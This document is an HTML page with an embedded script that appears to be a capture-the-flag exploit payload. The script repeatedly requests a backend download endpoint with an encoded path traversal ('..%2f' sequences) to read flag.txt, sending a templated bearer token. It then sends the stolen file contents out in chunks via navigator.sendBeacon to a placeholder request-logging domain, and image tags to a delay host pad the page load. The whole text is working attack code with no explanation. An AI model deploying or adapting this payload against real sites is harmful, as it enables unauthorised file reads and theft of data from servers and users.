<img src="//sleep.babelo.xyz/180?1">
<img src="//sleep.babelo.xyz/180?2">
<img src="//sleep.babelo.xyz/180?3">
<img src="//sleep.babelo.xyz/180?4">
<img src="//sleep.babelo.xyz/180?5">
<img src="//sleep.babelo.xyz/180?6">

<script>

let REQUESTREPO_DOMAIN = "{{REQUESTREPO}}";
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
(async () => {
    const CHUNK_SIZE = 8 * 1024;
    for (let i = 0; i < 1000; i++) {
        let res;
        try {
            res = await (await fetch(`http://backend.${REQUESTREPO_DOMAIN}:8001/download/..%2f..%2f..%2f..%2fflag.txt`, {
                headers: {
                    "Authorization": `Bearer {{DOWNLOAD_CREDS}}`
                }
            })).text();
        } catch (e) {
            res = `error: ${e}`;
        }
        if(res.search("Django") == -1){
            for (let offset = 0; offset < res.length; offset += CHUNK_SIZE) {
                const chunk = res.slice(offset, offset + CHUNK_SIZE);
                navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8001/log?count=${offset / CHUNK_SIZE + 1}`, chunk);
                
                await sleep(500);
            }

            navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8001/log?&end=1`, "dsadsadsa");

            return;
        }

        await sleep(5000);
    }
})();

</script>